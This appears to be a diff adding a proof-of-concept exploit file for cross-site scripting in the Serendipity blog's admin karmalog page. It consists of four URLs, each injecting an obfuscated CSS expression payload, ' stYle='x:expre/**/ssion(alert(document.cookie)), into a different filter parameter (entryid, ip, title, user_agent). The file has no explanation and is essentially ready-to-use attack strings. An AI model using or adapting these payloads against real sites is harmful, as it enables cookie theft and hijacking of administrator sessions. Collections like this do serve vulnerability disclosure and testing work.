@@ -1,0 +1,18 @@
+http://www.example.com/serendipity/serendipity_admin?serendipity[adminModule]=event_display&serendipity[adminAction]=karmalog&serendipity[adminAction]=karmalog&serendipity[adminModule]=event_display&serendipity[filter][entryid]='
+stYle='x:expre/**/ssion(alert(document.cookie))
+&serendipity[filter][ip]=3&serendipity[filter][title]=3&serendipity[filter][user_agent]=3&serendipity[sort][order]=votetime&serendipity[sort][ordermode]=DESC&submit=-+Go!+-
+
+http://www.example.com/serendipity/serendipity_admin?serendipity[adminModule]=event_display&serendipity[adminAction]=karmalog&serendipity[adminAction]=karmalog&serendipity[adminModule]=event_display&serendipity[filter][entryid]=3&serendipity[filter][ip]='
+stYle='x:expre/**/ssion(alert(document.cookie))
+&serendipity[filter][title]=3&serendipity[filter][user_agent]=3&serendipity[sort][order]=votetime&serendipity[sort][ordermode]=DESC&submit=-+Go!+-
+
+http://www.example.com/serendipity/serendipity_admin?serendipity[adminModule]=event_display&serendipity[adminAction]=karmalog&serendipity[adminAction]=karmalog&serendipity[adminModule]=event_display&serendipity[filter][entryid]=3&serendipity[filter][ip]=3&serendipity[filter][title]='
+stYle='x:expre/**/ssion(alert(document.cookie))
+&serendipity[filter][user_agent]=3&serendipity[sort][order]=votetime&serendipity[sort][ordermode]=DESC&submit=-+Go!+-
+
+http://www.example.com/serendipity/serendipity_admin?serendipity[adminModule]=event_display&serendipity[adminAction]=karmalog&serendipity[adminAction]=karmalog&serendipity[adminModule]=event_display&serendipity[filter][entryid]=3&serendipity[filter][ip]=3&serendipity[filter][title]=3&serendipity[filter][user_agent]='
+stYle='x:expre/**/ssion(alert(document.cookie)) &serendipity[sort][order]=votetime&serendipity[sort][ordermode]=DESC&submit=-+Go!+-
+
+
+
+
